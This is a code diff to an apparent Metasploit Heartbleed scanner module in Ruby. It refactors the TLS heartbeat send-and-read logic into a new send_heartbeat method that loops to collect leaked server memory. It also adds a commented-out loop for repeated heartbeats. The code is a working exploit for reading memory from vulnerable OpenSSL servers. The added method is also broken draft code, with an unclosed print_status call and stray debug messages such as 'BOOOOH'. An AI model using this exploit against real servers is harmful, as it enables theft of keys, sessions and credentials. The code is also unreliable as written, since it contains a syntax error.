@@ -248,44 +248,11 @@ class Metasploit3 < Msf::Auxiliary
       return
     end
 
-    vprint_status("#{peer} - Sending Heartbeat...")
-    sock.put(heartbeat(heartbeat_length))
-    hdr = sock.get_once(5)
-    if hdr.blank?
-      vprint_error("#{peer} - No Heartbeat response...")
-      return
-    end
+    heartbeat_data = send_heartbeat(sock)
+#    while(heartbeat_data && heartbeat_data.length < 131071)
+#      heartbeat_data << send_heartbeat(sock)
+#    end
 
-    unpacked = hdr.unpack('Cnn')
-    type = unpacked[0]
-    version = unpacked[1] # must match the type from client_hello
-    len = unpacked[2]
-
-    # try to get the TLS error
-    if type == ALERT_RECORD_TYPE
-      res = sock.get_once(len)
-      alert_unp = res.unpack('CC')
-      alert_level = alert_unp[0]
-      alert_desc = alert_unp[1]
-      msg = "Unknown error"
-      # http://tools.ietf.org/html/rfc5246#section-7.2
-      case alert_desc
-      when 0x46
-        msg = "Protocol error. Looks like the chosen protocol is not supported."
-      end
-      vprint_error("#{peer} - #{msg}")
-      disconnect
-      return
-    end
-
-    unless type == HEARTBEAT_RECORD_TYPE && version == TLS_VERSION[datastore['TLSVERSION']]
-      vprint_error("#{peer} - Unexpected Heartbeat response")
-      disconnect
-      return
-    end
-
-    vprint_status("#{peer} - Heartbeat response, checking if there is data leaked...")
-    heartbeat_data = sock.get_once(heartbeat_length) # Read the magic length...
     if heartbeat_data
       print_good("#{peer} - Heartbeat response with leak")
       report_vuln({
@@ -356,5 +323,57 @@ class Metasploit3 < Msf::Auxiliary
   def ssl_record(type, data)
     record = [type, TLS_VERSION[datastore['TLSVERSION']], data.length].pack('Cnn')
     record << data
+  end
+
+  def send_heartbeat(s)
+    vprint_status("#{peer} - Sending Heartbeat...")
+    print_status("#{peer} - Sending Heartbeat...")
+    sock.put(heartbeat(heartbeat_length))
+print_status("#{peer} - Sending Heartbeat..."
+    hdr = sock.get_once(5)
+    if hdr.blank?
+      vprint_error("#{peer} - No Heartbeat response...")
+      return
+    end
+print_status("#{peer} - Unpacking header")
+    unpacked = hdr.unpack('Cnn')
+    type = unpacked[0]
+    version = unpacked[1] # must match the type from client_hello
+    len = unpacked[2]
+
+    # try to get the TLS error
+    if type == ALERT_RECORD_TYPE
+      res = sock.get_once(len)
+      alert_unp = res.unpack('CC')
+      alert_level = alert_unp[0]
+      alert_desc = alert_unp[1]
+      msg = "Unknown error"
+      # http://tools.ietf.org/html/rfc5246#section-7.2
+      case alert_desc
+      when 0x46
+        msg = "Protocol error. Looks like the chosen protocol is not supported."
+      end
+      vprint_error("#{peer} - #{msg}")
+      disconnect
+      return
+    end
+print_status("#{peer} - BOOOOH")
+    unless type == HEARTBEAT_RECORD_TYPE && version == TLS_VERSION[datastore['TLSVERSION']]
+      vprint_error("#{peer} - Unexpected Heartbeat response")
+      disconnect
+      return
+    end
+    print_status("#{peer} - Heartbeat response, checking if there is data leaked...")
+    vprint_status("#{peer} - Heartbeat response, checking if there is data leaked...")
+
+    # Read the magic length...
+print_status("SHOULDg reading data...")
+    dummy_data = sock.get_once(heartbeat_length)
+    print_status("Getting data...")
+    while(dummy_data && dummy_data.length < heartbeat_length)
+      print_status("Got other data...")
+      dummy_data << sock.get_once(heartbeat_length)
+    end
+    return dummy_data
   end
 end
